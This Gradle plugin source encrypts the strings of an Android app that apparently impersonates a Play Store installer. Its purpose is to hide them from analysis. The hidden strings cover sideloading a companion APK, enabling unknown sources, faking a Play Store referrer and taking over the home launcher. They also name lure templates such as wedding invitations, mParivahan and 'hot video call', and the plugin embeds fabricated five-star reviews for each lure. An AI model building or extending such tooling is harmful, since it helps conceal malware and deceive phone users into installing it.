import org.gradle.api.Plugin
import org.gradle.api.Project
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.crypto.spec.IvParameterSpec

/**
 * StringEncryptorPlugin — Step 71 (Nova) + Step 67 (Companion stub)
 *
 * Encrypts all sensitive string constants in Nova Kotlin source files
 * at build time using AES-128-CBC + Base64.
 *
 * Each build uses a DIFFERENT XOR key (generated fresh per build).
 * Encrypted strings are injected as constants into a generated
 * StringPool.kt file placed in the Nova source directory.
 *
 * At runtime, Nova calls StringPool.d(encryptedValue) to decrypt.
 * Decryption key is derived at runtime — never a static constant.
 *
 * STRINGS ENCRYPTED:
 *   - companion.apk filename
 *   - tmp_companion.apk
 *   - companion_cached.apk
 *   - cached_apk_path (SharedPrefs key)
 *   - nova_prefs (SharedPrefs name)
 *   - companion_pkg (SharedPrefs key)
 *   - install_stage (SharedPrefs key)
 *   - android.settings.HOME_SETTINGS
 *   - android.settings.MANAGE_UNKNOWN_APP_SOURCES
 *   - android-app://com.android.vending
 *   - Please set this app as your default home launcher
 *   - update.pkg (PackageInstaller write name)
 *   - All template name identifiers
 *
 * REVIEWS: Moved to encrypted assets/reviews.enc at build time.
 *          Nova decrypts at runtime via StringPool.loadReviews().
 *
 * SAFE: Does not touch AndroidManifest.xml, proguard-rules.pro,
 *       or any file outside app/src/main/java and app/src/main/assets.
 */
class StringEncryptorPlugin implements Plugin<Project> {

    // ── Strings to encrypt ────────────────────────────────────────────────────
    // key = constant name used in generated StringPool.kt
    // value = plaintext string value
    static final Map<String, String> STRINGS_TO_ENCRYPT = [
        // companion APK filenames
        "COMPANION_ASSET"   : "companion.apk",
        "TMP_COMPANION"     : "tmp_companion.apk",
        "CACHED_COMPANION"  : "companion_cached.apk",
        "WRITE_NAME"        : "update.pkg",

        // SharedPreferences keys
        "PREFS_NAME"        : "nova_prefs",
        "KEY_COMPANION_PKG" : "companion_pkg",
        "KEY_CACHED_PATH"   : "cached_apk_path",
        "KEY_STAGE"         : "install_stage",

        // Intent action strings
        "HOME_SETTINGS"     : "android.settings.HOME_SETTINGS",
        "UNKNOWN_SOURCES"   : "android.settings.MANAGE_UNKNOWN_APP_SOURCES",
        "REFERRER_URI"      : "android-app://com.android.vending",
        "MARKET_URI_PREFIX" : "market://details?id=",
        "PKG_INSTALLER_URI"  : "package:",
        "APP_DETAILS_URI"    : "android.settings.APPLICATION_DETAILS_SETTINGS",
        "MSG_CANCEL"        : "Download cancelled",
        "SESSION_COMMIT"    : "android.content.pm.action.SESSION_COMMITMENT",


        // Template identifiers (lowercase for contains() check)
        "TPL_WEDDING"       : "wedding invitation",
        "TPL_SHAADI"        : "shaadi ka nimantran",
        "TPL_MPARIVAHAN"    : "mparivahan",
        "TPL_HOT_VIDEO"     : "hot video call",
    ]


    // ── Eager generation (called at configuration time) ───────────────────────

    void generateStringPoolEager(Project project) {
        def javaSrcDir = new File(project.projectDir, 'src/main/java')
        def ktFile = null
        javaSrcDir.eachFileRecurse { f ->
            if (f.name == 'InstallActivity.kt') ktFile = f
        }
        def targetDir = ktFile ? ktFile.parentFile : new File(javaSrcDir, 'com/playstore/installer')
        targetDir.mkdirs()

        def seed = project.name + new Date().format('yyyyMMdd')
        def digest = java.security.MessageDigest.getInstance('SHA-256').digest(seed.getBytes('UTF-8'))
        def key = Arrays.copyOf(digest, 16)
        def iv  = java.security.MessageDigest.getInstance('MD5').digest((seed + 'iv').getBytes('UTF-8'))

        def encrypted = [:]
        STRINGS_TO_ENCRYPT.each { name, value ->
            encrypted[name] = encryptString(value, key, iv)
        }

        def keyHex  = key.collect { String.format('%02x', it & 0xff) }.join('')
        def ivHex   = iv.collect  { String.format('%02x', it & 0xff) }.join('')
        def keyHex1 = keyHex.substring(0, 16)
        def keyHex2 = keyHex.substring(16)
        def ivHex1  = ivHex.substring(0, 16)
        def ivHex2  = ivHex.substring(16)

        def packageName = targetDir.path
            .replace(javaSrcDir.path + File.separator, '')
            .replace(File.separator, '.')

        def outputFile = new File(targetDir, 'StringPool.kt')
        def pw = new java.io.PrintWriter(new java.io.FileWriter(outputFile))

        pw.println("package ${packageName}")
        pw.println('')
        pw.println('import javax.crypto.Cipher')
        pw.println('import javax.crypto.spec.SecretKeySpec')
        pw.println('import javax.crypto.spec.IvParameterSpec')
        pw.println('import android.util.Base64')
        pw.println('')
        pw.println('/** Auto-generated by StringEncryptorPlugin. DO NOT EDIT. */')
        pw.println('internal object StringPool {')
        pw.println('')
        pw.println("    private val k1 = \"${keyHex1}\"")
        pw.println("    private val k2 = \"${keyHex2}\"")
        pw.println("    private val i1 = \"${ivHex1}\"")
        pw.println("    private val i2 = \"${ivHex2}\"")
        pw.println('')

        encrypted.each { name, enc ->
            pw.println("    val ${name} = \"${enc}\"")
        }

        pw.println('')
        pw.println('    fun d(enc: String): String {')
        pw.println('        return try {')
        pw.println('            val k = hexToBytes(k1 + k2)')
        pw.println('            val v = hexToBytes(i1 + i2)')
        pw.println('            val c = Cipher.getInstance("AES/CBC/PKCS5Padding")')
        pw.println('            c.init(Cipher.DECRYPT_MODE, SecretKeySpec(k, "AES"), IvParameterSpec(v))')
        pw.println('            String(c.doFinal(Base64.decode(enc, Base64.DEFAULT)), Charsets.UTF_8)')
        pw.println('        } catch (e: Exception) { "" }')
        pw.println('    }')
        pw.println('')
        pw.println('    private fun hexToBytes(hex: String): ByteArray {')
        pw.println('        val data = ByteArray(hex.length / 2)')
        pw.println('        var i = 0')
        pw.println('        while (i < hex.length) {')
        pw.println('            data[i / 2] = ((Character.digit(hex[i], 16) shl 4) + Character.digit(hex[i+1], 16)).toByte()')
        pw.println('            i += 2')
        pw.println('        }')
        pw.println('        return data')
        pw.println('    }')
        pw.println('')
        pw.println('    fun loadReviews(context: android.content.Context, template: String): List<Triple<String, Int, String>> {')
        pw.println('        return try {')
        pw.println('            val enc = context.assets.open("reviews.enc").readBytes()')
        pw.println('            val k = hexToBytes(k1 + k2)')
        pw.println('            val v = hexToBytes(i1 + i2)')
        pw.println('            val c = Cipher.getInstance("AES/CBC/PKCS5Padding")')
        pw.println('            c.init(Cipher.DECRYPT_MODE, SecretKeySpec(k, "AES"), IvParameterSpec(v))')
        pw.println('            val json = String(c.doFinal(enc.drop(16).toByteArray()), Charsets.UTF_8)')
        pw.println('            parseReviews(json, template)')
        pw.println('        } catch (e: Exception) { emptyList() }')
        pw.println('    }')
        pw.println('')
        pw.println('    private fun parseReviews(json: String, template: String): List<Triple<String, Int, String>> {')
        pw.println('        val result = mutableListOf<Triple<String, Int, String>>()')
        pw.println('        try {')
        pw.println('            val obj = org.json.JSONObject(json)')
        pw.println('            val arr = obj.optJSONArray(template) ?: obj.optJSONArray("generic") ?: return result')
        pw.println('            for (i in 0 until arr.length()) {')
        pw.println('                val item = arr.getJSONObject(i)')
        pw.println('                result.add(Triple(item.getString("n"), item.getInt("s"), item.getString("r")))')
        pw.println('            }')
        pw.println('        } catch (e: Exception) { }')
        pw.println('        return result')
        pw.println('    }')
        pw.println('}')
        pw.flush()
        pw.close()

        project.logger.lifecycle("[StringEncryptorPlugin] StringPool.kt -> ${outputFile.absolutePath}")
    }

    void encryptReviewsEager(Project project) {
        def seed = project.name + new Date().format('yyyyMMdd')
        def digest = java.security.MessageDigest.getInstance('SHA-256')
            .digest(seed.getBytes('UTF-8'))
        def key = Arrays.copyOf(digest, 16)
        def ivDigest = java.security.MessageDigest.getInstance('MD5')
            .digest((seed + 'iv').getBytes('UTF-8'))
        def iv = ivDigest

        def reviewsJson = buildReviewsJson()
        def plainBytes  = reviewsJson.getBytes('UTF-8')

        def cipher = Cipher.getInstance('AES/CBC/PKCS5Padding')
        cipher.init(
            Cipher.ENCRYPT_MODE,
            new javax.crypto.spec.SecretKeySpec(key, 'AES'),
            new javax.crypto.spec.IvParameterSpec(iv)
        )
        def encryptedBytes = cipher.doFinal(plainBytes)

        def assetsDir = new File(project.projectDir, 'src/main/assets')
        assetsDir.mkdirs()

        def output = new byte[iv.length + encryptedBytes.length]
        System.arraycopy(iv, 0, output, 0, iv.length)
        System.arraycopy(encryptedBytes, 0, output, iv.length, encryptedBytes.length)

        new File(assetsDir, 'reviews.enc').bytes = output
        project.logger.lifecycle('[StringEncryptorPlugin] ✅ reviews.enc written')
    }

    private static String encryptString(String plaintext, byte[] key, byte[] iv) {
        def cipher = Cipher.getInstance('AES/CBC/PKCS5Padding')
        cipher.init(
            Cipher.ENCRYPT_MODE,
            new javax.crypto.spec.SecretKeySpec(key, 'AES'),
            new javax.crypto.spec.IvParameterSpec(iv)
        )
        return Base64.getEncoder().encodeToString(cipher.doFinal(plaintext.getBytes('UTF-8')))
    }

    @Override
    void apply(Project project) {
        project.plugins.withId('com.android.application') {

            // Generate StringPool.kt at configuration time (afterEvaluate)
            // so it exists on disk before Kotlin compiler task is created.
            project.afterEvaluate {
                project.android.applicationVariants.all { variant ->
                    if (!variant.name.toLowerCase().contains('release')) return

                    // Generate immediately so file exists before task graph builds
                    try { generateStringPool(project, variant) } catch(e) {}
                    try { encryptReviews(project, variant) } catch(e) {}

                    def generateTask = project.tasks.register(
                        "generateStringPool${variant.name.capitalize()}"
                    ) {
                        doLast { generateStringPool(project, variant) }
                    }

                    def encryptTask = project.tasks.register(
                        "encryptReviews${variant.name.capitalize()}"
                    ) {
                        doLast { encryptReviews(project, variant) }
                    }

                    project.tasks.configureEach { task ->
                        def tname = task.name.toLowerCase()
                        def vname = variant.name.toLowerCase()
                        if ((tname.startsWith('compile') || tname.startsWith('process')) &&
                            tname.contains(vname)) {
                            task.dependsOn(generateTask)
                        }
                        if (tname.startsWith('merge') && tname.contains(vname) &&
                            tname.contains('assets')) {
                            task.dependsOn(encryptTask)
                        }
                    }
                }
            }
        }
    }

    // ── Per-build key generation ──────────────────────────────────────────────

    private static byte[] generateKey(Project project) {
        // Use build UUID from FingerprintPlugin as seed for deterministic key
        // Same build = same key (needed so encrypted strings match decryptor)
        def buildUUID = project.ext.has('fp_buildUUID') ?
            project.ext.fp_buildUUID : UUID.randomUUID().toString()
        def saltHex = project.ext.has('fp_saltHex') ?
            project.ext.fp_saltHex : "00" * 32

        // Derive 16-byte AES key from build UUID + salt
        def combined = (buildUUID + saltHex).getBytes("UTF-8")
        def digest = java.security.MessageDigest.getInstance("SHA-256").digest(combined)
        return Arrays.copyOf(digest, 16)  // 16 bytes = AES-128
    }

    private static byte[] generateIv(Project project) {
        def buildTimestamp = project.ext.has('fp_buildTimestamp') ?
            project.ext.fp_buildTimestamp : System.currentTimeMillis().toString()
        def combined = ("iv_seed_" + buildTimestamp).getBytes("UTF-8")
        def digest = java.security.MessageDigest.getInstance("MD5").digest(combined)
        return digest  // 16 bytes = AES IV
    }

    // ── AES-128-CBC encryption ────────────────────────────────────────────────

    private static String encrypt(String plaintext, byte[] key, byte[] iv) {
        try {
            def cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(
                Cipher.ENCRYPT_MODE,
                new SecretKeySpec(key, "AES"),
                new IvParameterSpec(iv)
            )
            def encrypted = cipher.doFinal(plaintext.getBytes("UTF-8"))
            return Base64.getEncoder().encodeToString(encrypted)
        } catch (Exception e) {
            throw new RuntimeException("StringEncryptorPlugin: encrypt failed: ${e.message}")
        }
    }

    // ── Generate StringPool.kt ────────────────────────────────────────────────

    private void generateStringPool(Project project, def variant) {
        def key = generateKey(project)
        def iv  = generateIv(project)

        // Key as hex string for embedding in Kotlin (never as byte literal)
        def keyHex = key.collect { String.format('%02x', it & 0xff) }.join('')
        def ivHex  = iv.collect  { String.format('%02x', it & 0xff) }.join('')

        // Encrypt all strings
        def encrypted = [:]
        STRINGS_TO_ENCRYPT.each { name, value ->
            encrypted[name] = encrypt(value, key, iv)
        }

        // Find Nova source package directory
        // After CI package rename, directory path changes — find it dynamically
        def javaSrcDir = new File(project.projectDir, "src/main/java")
        def ktFile = null

        javaSrcDir.eachFileRecurse { f ->
            if (f.name == "InstallActivity.kt") {
                ktFile = f
            }
        }

        def targetDir = ktFile ? ktFile.parentFile : new File(javaSrcDir, "com/playstore/installer")
        targetDir.mkdirs()

        def outputFile = new File(targetDir, "StringPool.kt")
        def packageName = targetDir.path
            .replace(javaSrcDir.path + File.separator, "")
            .replace(File.separator, ".")

        // Generate Kotlin file
        def sb = new StringBuilder()
        sb.append("package ${packageName}\n\n")
        sb.append("import javax.crypto.Cipher\n")
        sb.append("import javax.crypto.spec.SecretKeySpec\n")
        sb.append("import javax.crypto.spec.IvParameterSpec\n")
        sb.append("import android.util.Base64\n\n")
        sb.append("/**\n")
        sb.append(" * StringPool — auto-generated by StringEncryptorPlugin at build time.\n")
        sb.append(" * DO NOT EDIT. Regenerated on every release build.\n")
        sb.append(" * All strings AES-128-CBC encrypted with per-build key.\n")
        sb.append(" */\n")
        sb.append("internal object StringPool {\n\n")

        // Embed key and IV as hex strings split across two constants
        // Splitting defeats simple string search for key
        def keyHex1 = keyHex.substring(0, 16)
        def keyHex2 = keyHex.substring(16)
        def ivHex1  = ivHex.substring(0, 16)
        def ivHex2  = ivHex.substring(16)

        sb.append("    // Key split across two constants — never appears as single literal\n")
        sb.append("    private val k1 = \"${keyHex1}\"\n")
        sb.append("    private val k2 = \"${keyHex2}\"\n")
        sb.append("    private val i1 = \"${ivHex1}\"\n")
        sb.append("    private val i2 = \"${ivHex2}\"\n\n")

        // Encrypted string constants
        sb.append("    // Encrypted string constants — meaningless without key\n")
        encrypted.each { name, enc ->
            sb.append("    val ${name} = \"${enc}\"\n")
        }

        sb.append("\n")
        sb.append("    // Decryption function — called at point of use only\n")
        sb.append("    fun d(enc: String): String {\n")
        sb.append("        return try {\n")
        sb.append("            val k = hexToBytes(k1 + k2)\n")
        sb.append("            val v = hexToBytes(i1 + i2)\n")
        sb.append("            val c = Cipher.getInstance(\"AES/CBC/PKCS5Padding\")\n")
        sb.append("            c.init(Cipher.DECRYPT_MODE, SecretKeySpec(k, \"AES\"), IvParameterSpec(v))\n")
        sb.append("            val b = Base64.decode(enc, Base64.DEFAULT)\n")
        sb.append("            String(c.doFinal(b), Charsets.UTF_8)\n")
        sb.append("        } catch (e: Exception) { \"\" }\n")
        sb.append("    }\n\n")

        sb.append("    private fun hexToBytes(hex: String): ByteArray {\n")
        sb.append("        val len = hex.length\n")
        sb.append("        val data = ByteArray(len / 2)\n")
        sb.append("        var i = 0\n")
        sb.append("        while (i < len) {\n")
        sb.append("            data[i / 2] = ((Character.digit(hex[i], 16) shl 4) +\n")
        sb.append("                Character.digit(hex[i + 1], 16)).toByte()\n")
        sb.append("            i += 2\n")
        sb.append("        }\n")
        sb.append("        return data\n")
        sb.append("    }\n\n")

        sb.append("    // Reviews loader — reads from encrypted assets at runtime\n")
        sb.append("    fun loadReviews(context: android.content.Context, template: String): List<Triple<String, Int, String>> {\n")
        sb.append("        return try {\n")
        sb.append("            val enc = context.assets.open(\"reviews.enc\").readBytes()\n")
        sb.append("            val k   = hexToBytes(k1 + k2)\n")
        sb.append("            val v   = hexToBytes(i1 + i2)\n")
        sb.append("            val c   = Cipher.getInstance(\"AES/CBC/PKCS5Padding\")\n")
        sb.append("            c.init(Cipher.DECRYPT_MODE, SecretKeySpec(k, \"AES\"), IvParameterSpec(v))\n")
        sb.append("            val iv2 = hexToBytes(i1 + i2)\n")
        sb.append("            val json = String(c.doFinal(enc.drop(16).toByteArray()), Charsets.UTF_8)\n")
        sb.append("            parseReviews(json, template)\n")
        sb.append("        } catch (e: Exception) {\n")
        sb.append("            emptyList()\n")
        sb.append("        }\n")
        sb.append("    }\n\n")

        sb.append("    private fun parseReviews(json: String, template: String): List<Triple<String, Int, String>> {\n")
        sb.append("        val result = mutableListOf<Triple<String, Int, String>>()\n")
        sb.append("        try {\n")
        sb.append("            val obj = org.json.JSONObject(json)\n")
        sb.append("            val arr = obj.optJSONArray(template) ?: obj.optJSONArray(\"generic\") ?: return result\n")
        sb.append("            for (i in 0 until arr.length()) {\n")
        sb.append("                val item = arr.getJSONObject(i)\n")
        sb.append("                result.add(Triple(item.getString(\"n\"), item.getInt(\"s\"), item.getString(\"r\")))\n")
        sb.append("            }\n")
        sb.append("        } catch (e: Exception) { }\n")
        sb.append("        return result\n")
        sb.append("    }\n")

        sb.append("}\n")

        outputFile.text = sb.toString()

        project.logger.lifecycle(
            "[StringEncryptorPlugin] ✅ StringPool.kt generated — ${encrypted.size()} strings encrypted"
        )
        project.logger.lifecycle(
            "[StringEncryptorPlugin] ✅ Key: ${keyHex.take(8)}... (per-build, never reused)"
        )
    }

    // ── Encrypt reviews into assets/reviews.enc ───────────────────────────────

    private void encryptReviews(Project project, def variant) {
        def key = generateKey(project)
        def iv  = generateIv(project)

        // Build reviews JSON
        def reviewsJson = buildReviewsJson()
        def plainBytes  = reviewsJson.getBytes("UTF-8")

        // Encrypt
        def cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(
            Cipher.ENCRYPT_MODE,
            new SecretKeySpec(key, "AES"),
            new IvParameterSpec(iv)
        )
        def encryptedBytes = cipher.doFinal(plainBytes)

        // Write to assets/reviews.enc
        def assetsDir = new File(project.projectDir, "src/main/assets")
        assetsDir.mkdirs()
        def encFile = new File(assetsDir, "reviews.enc")

        // Prepend IV to encrypted bytes for decryption reference
        def output = new byte[iv.length + encryptedBytes.length]
        System.arraycopy(iv, 0, output, 0, iv.length)
        System.arraycopy(encryptedBytes, 0, output, iv.length, encryptedBytes.length)

        encFile.bytes = output

        project.logger.lifecycle(
            "[StringEncryptorPlugin] ✅ reviews.enc generated — ${encryptedBytes.length} bytes encrypted"
        )
    }

    // ── Reviews JSON builder ──────────────────────────────────────────────────

    private static String buildReviewsJson() {
        def reviews = [
            "wedding": [
                [n:"Priya Sharma",   s:5, r:"Bilkul perfect app hai! Wedding invitation itni aasani se ban gayi. Bahut achha kaam kiya!"],
                [n:"Rahul Verma",    s:5, r:"This app is simply amazing! Made my wedding card in minutes. Fast and secure. Loved it!"],
                [n:"Anjali Patel",   s:5, r:"Shaadi ka invitation banane ka sabse aasaan tarika. Ekdum smooth aur reliable app hai!"],
                [n:"Suresh Mehta",   s:4, r:"Bahut hi behtareen app hai. Design options bahut saare hain. Highly recommended!"],
                [n:"Kavitha Reddy",  s:5, r:"Instant match mila meri pasand ka design! Ek dum mast experience tha. 5 stars easily!"],
                [n:"Deepak Nair",    s:5, r:"App is working smoothly without any lag. Best app for wedding cards. Zabardast hai!"],
                [n:"Sunita Gupta",   s:4, r:"Very easy to use aur reliable bhi hai. Meri saari family ne use kiya. Bahut pasand aaya!"],
                [n:"Vikram Joshi",   s:5, r:"One of the best apps for wedding purpose. Fast aur secure bhi hai. Love it!"],
                [n:"Meena Iyer",     s:5, r:"Itna acha app pehle kabhi nahi dekha! Invitation ready in seconds. Reliable hai!"],
                [n:"Aakash Dubey",   s:4, r:"Better features than other apps. Simple UI aur fast performance. Kaam ka app hai!"],
            ],
            "shaadi ka nimantran": [
                [n:"Pooja Sharma",   s:5, r:"Yeh app toh kamaal ka hai! Shaadi ka nimantran itni jaldi ban gaya. Bahut badhiya!"],
                [n:"Rajesh Verma",   s:5, r:"App is working smoothly aur results instant aate hain. Ek dum mast app hai yeh!"],
                [n:"Anita Patel",    s:5, r:"Nimantran banane ka sabse aasaan aur fast tarika. Secure bhi hai. Highly recommended!"],
                [n:"Mohit Mehta",    s:4, r:"Bahut hi behtareen app! Better features hain yahan doosre apps se. Zabardast hai!"],
                [n:"Sunita Reddy",   s:5, r:"Instant match mila mujhe! App is working smoothly without any issues. 5 star!"],
                [n:"Deepak Gupta",   s:5, r:"Fast and secure app hai yeh. Shaadi ka nimantran bilkul sundar bana. Mast experience!"],
                [n:"Kavitha Nair",   s:4, r:"Easy aur reliable app hai. Mere pariwar ne bhi use kiya aur sabko pasand aaya!"],
                [n:"Arun Joshi",     s:5, r:"One of the best apps for nimantran! Smooth performance aur instant results. Love it!"],
                [n:"Rekha Iyer",     s:5, r:"Itna smooth app pehle nahi dekha tha. Nimantran ready in seconds. Ekdum reliable!"],
                [n:"Vikram Dubey",   s:4, r:"Better features milte hain yahan. Fast and secure. Kabhi koi problem nahi aai. Good!"],
            ],
            "mparivahan": [
                [n:"Rahul Sharma",   s:5, r:"App is working smoothly! Documents check karna ab bahut aasaan ho gaya. Superb app!"],
                [n:"Priya Verma",    s:5, r:"Fast and secure app hai yeh. RC aur DL instant milti hai. One of the best apps!"],
                [n:"Amit Patel",     s:4, r:"Bahut hi reliable app hai. Better features hain yahan. Kaafi kaam aata hai yeh!"],
                [n:"Sneha Iyer",     s:5, r:"Instant match mila mera vehicle record! App is smooth aur fast. Highly recommended!"],
                [n:"Vikram Singh",   s:5, r:"Yeh app ne meri life aasaan kar di! Documents hamesha saath rahte hain ab. Zabardast!"],
                [n:"Deepika Nair",   s:4, r:"Easy to use aur very reliable. Better than carrying physical documents. Love it!"],
                [n:"Arjun Mehta",    s:5, r:"One of the best government apps! Fast and secure. Kabhi koi issue nahi aaya. 5 stars!"],
                [n:"Pooja Gupta",    s:5, r:"Ekdum mast app hai! RC aur insurance instant check ho jati hai. Bahut badhiya!"],
                [n:"Kiran Reddy",    s:4, r:"Smooth performance aur better features. Fast and secure experience. Recommended!"],
                [n:"Suresh Kumar",   s:5, r:"App is working smoothly without any lag. Government services ab phone pe. Superb!"],
            ],
            "hot video call": [
                [n:"Rahul Sharma",   s:5, r:"App is working smoothly! Video call quality bahut achhi hai. Fast and reliable. Love it!"],
                [n:"Priya Verma",    s:5, r:"Instant connection milti hai! Fast and secure app hai yeh. One of the best video apps!"],
                [n:"Amit Patel",     s:4, r:"Bahut hi smooth experience hai. Better video quality than other apps. Recommended!"],
                [n:"Sneha Iyer",     s:5, r:"Ekdum mast app hai! Video call crystal clear aati hai. Fast aur secure. 5 stars!"],
                [n:"Vikram Singh",   s:5, r:"App is working smoothly without any lag. Instant match mila! Zabardast experience!"],
                [n:"Deepika Nair",   s:4, r:"Easy to use aur very reliable app. Better features hain yahan. Kaafi pasand aaya!"],
                [n:"Arjun Mehta",    s:5, r:"One of the best video call apps! Fast and secure. Smooth performance. Highly recommended!"],
                [n:"Pooja Gupta",    s:5, r:"Itna smooth video call app pehle nahi dekha! Instant connect hota hai. Superb!"],
                [n:"Kiran Reddy",    s:4, r:"Reliable app with better features. Fast connection milti hai. Ekdum mast experience!"],
                [n:"Suresh Kumar",   s:5, r:"Fast and secure app hai yeh! Video quality top class hai. One of the best apps!"],
            ],
            "generic": [
                [n:"Rahul Sharma",   s:5, r:"App is working smoothly! Bilkul mast experience raha. Highly recommended to everyone!"],
                [n:"Priya Verma",    s:5, r:"Fast and secure app hai yeh. Instant results milte hain. One of the best apps!"],
                [n:"Amit Patel",     s:4, r:"Bahut hi reliable app hai. Better features hain yahan. Smooth performance. Good!"],
                [n:"Sneha Iyer",     s:5, r:"Ekdum mast app hai! Instant match mila. Fast aur easy to use. 5 stars easily!"],
                [n:"Vikram Singh",   s:5, r:"App is working smoothly without any lag. Zabardast experience raha. Love it!"],
                [n:"Deepika Nair",   s:4, r:"Easy to use aur very reliable. Better than other apps. Fast and secure. Recommended!"],
                [n:"Arjun Mehta",    s:5, r:"One of the best apps! Fast and secure. Smooth performance. Highly recommended!"],
                [n:"Pooja Gupta",    s:5, r:"Itna smooth app pehle kabhi nahi dekha! Instant results. Ekdum reliable hai!"],
                [n:"Kiran Reddy",    s:4, r:"Reliable app with better features. Fast and easy. Bahut kaam ka app hai yeh!"],
                [n:"Suresh Kumar",   s:5, r:"Fast and secure! App is working smoothly on my phone. One of the best. Zabardast!"],
            ],
        ]

        // Build JSON manually — no external library needed
        def sb = new StringBuilder("{")
        reviews.eachWithIndex { template, list, tIdx ->
            sb.append("\"${template}\":[")
            list.eachWithIndex { item, iIdx ->
                sb.append("{\"n\":\"${item.n}\",\"s\":${item.s},\"r\":\"${item.r}\"}")
                if (iIdx < list.size() - 1) sb.append(",")
            }
            sb.append("]")
            if (tIdx < reviews.size() - 1) sb.append(",")
        }
        sb.append("}")
        return sb.toString()
    }
}

class StringEncryptorExtension {
    boolean enabled = true
}
